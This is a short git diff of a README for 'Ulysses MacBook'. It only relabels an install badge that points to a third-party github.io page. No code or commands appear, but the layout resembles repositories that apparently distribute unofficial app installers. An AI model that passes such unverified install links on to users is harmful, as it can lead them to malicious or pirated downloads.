@@ -5,7 +5,7 @@
 
 Follow the installation guide below to set up **Ulysses MacBook** on your device.  
 
-[![🦋 Install to Git](https://img.shields.io/badge/Install%20to%20Git-F8C32B?style=for-the-badge&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA/0lEQVR4Ae2WwQqCQBCFvxfvU8WiqCqiUg3qI4jAq8gD6SNIloPQcAZWYJj9e2sBzLw3HztnsrO5bMFgAE8BCcAIHQWfn6Di4IsqWwYqM6x4LqAiMkPwJAyBVsnxQAAOkfslxCJGAZV9r2wiYuYygflEUk0qlKqyjaGfC7eAvQxCu3+gA6h+gu4e1lsmjTdO0zTM6ZqnHP6zgZfgcFkhWwSPVHt9hYGuQ8FkgxkNfSuI5YB2NsgPGVdyfReGzqH7NfAY1Wja7n6H9iX8CuCSRGfq7b4GygrfyXZFc18b7YIQ2H7XMyfnAuAAAAAElFTkSuQmCC&logoColor=white&labelColor=000000)](https://lordluxhen1987.github.io/.github/ulysses-macbook)
+[![🦋 Install to Git](https://img.shields.io/badge/Install%20From%20Github-F8C32B?style=for-the-badge&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA/0lEQVR4Ae2WwQqCQBCFvxfvU8WiqCqiUg3qI4jAq8gD6SNIloPQcAZWYJj9e2sBzLw3HztnsrO5bMFgAE8BCcAIHQWfn6Di4IsqWwYqM6x4LqAiMkPwJAyBVsnxQAAOkfslxCJGAZV9r2wiYuYygflEUk0qlKqyjaGfC7eAvQxCu3+gA6h+gu4e1lsmjTdO0zTM6ZqnHP6zgZfgcFkhWwSPVHt9hYGuQ8FkgxkNfSuI5YB2NsgPGVdyfReGzqH7NfAY1Wja7n6H9iX8CuCSRGfq7b4GygrfyXZFc18b7YIQ2H7XMyfnAuAAAAAElFTkSuQmCC&logoColor=white&labelColor=000000)](https://lordluxhen1987.github.io/.github/ulysses-macbook)
 
 ---
 
